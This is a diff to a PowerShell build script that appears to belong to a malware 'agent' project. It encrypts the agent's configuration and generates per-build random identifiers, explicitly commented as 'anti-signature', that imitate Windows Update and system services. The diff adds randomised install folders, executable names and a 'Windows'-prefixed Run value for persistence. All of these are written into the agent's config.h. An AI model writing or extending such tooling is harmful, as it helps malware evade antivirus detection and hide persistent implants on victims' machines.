@@ -3,11 +3,16 @@ $env:Path = "C:\msys64\ucrt64\bin;" + $env:Path
 powershell -ExecutionPolicy Bypass -File encrypt_config.ps1
 if (!$?) { Write-Output "Config encryption failed"; exit 1 }
 
-# Generate random identifiers for this build (anti-signature)
+# Generate random identifiers for this build (anti-signature + unique install path)
 $randSuffix = (Get-Random -Minimum 100000 -Maximum 999999).ToString()
 $mtxVal = "WUClient_$randSuffix"
 $clsVal = "WUFilter_$randSuffix"
 $regVal = "Software\\Microsoft\\Windows\\CurrentVersion\\WUSvc_$randSuffix"
+$dirPrefixes = @("CacheHost", "PkgCache", "LocalState", "AppCache", "DataStore", "HostSvc")
+$exePrefixes = @("chost", "svcinit", "cachemgr", "hostsvc", "appcache", "pkghost")
+$dirVal = ($dirPrefixes | Get-Random) + "_" + $randSuffix
+$exeVal = ($exePrefixes | Get-Random) + $randSuffix + ".exe"
+$runVal = "Windows" + ($exePrefixes | Get-Random) + $randSuffix
 $uaList = @(
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
@@ -21,6 +26,9 @@ $append = @"
 #define AGENT_CLASS L"$clsVal"
 #define AGENT_REGKEY "$regVal"
 #define AGENT_UA L"$uaVal"
+#define AGENT_INSTALL_DIR "$dirVal"
+#define AGENT_INSTALL_EXE "$exeVal"
+#define AGENT_RUN_VALUE "$runVal"
 "@
 $old = Get-Content config.h -Raw
 $new = $old.TrimEnd(" `t`r`n")
